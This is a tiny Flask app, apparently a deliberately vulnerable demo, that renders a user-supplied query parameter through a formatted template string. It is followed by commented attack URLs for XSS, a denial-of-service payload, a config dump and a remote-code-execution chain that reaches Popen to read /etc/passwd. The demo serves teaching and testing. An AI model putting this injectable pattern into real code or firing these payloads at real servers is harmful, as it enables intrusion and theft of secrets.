from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name')
    template = '''
        <html>
            <body>
                <h1>Hello, %s!</h1>
            </body>
        </html>
    '''
    return render_template_string(template % request.args.get("name"))

if __name__ == '__main__':
    app.run(debug=True)
# curl http://localhost:5000/?name=World
# XSS: open a brower http://localhost:5000/?name='<script>alert(1)</script>'
# DoS: curl http://localhost:5000/?name={{1000000000*'1'}}
# Exfiltrate Config: curl http://localhost:5000/?name={{config}}
# RCE: open a browser http://localhost:5000/?name={{config.from_object('os') }} and then http://localhost:5000/?name={{%22%22.__class__.__mro__[1].__subclasses__()}} to find Popen subclass and the from the index of it run commands http://localhost:5000/?name={{%22%22.__class__.__mro__[1].__subclasses__()[454]('cat%20/etc/passwd',shell=True,stdout=-1).communicate()}}
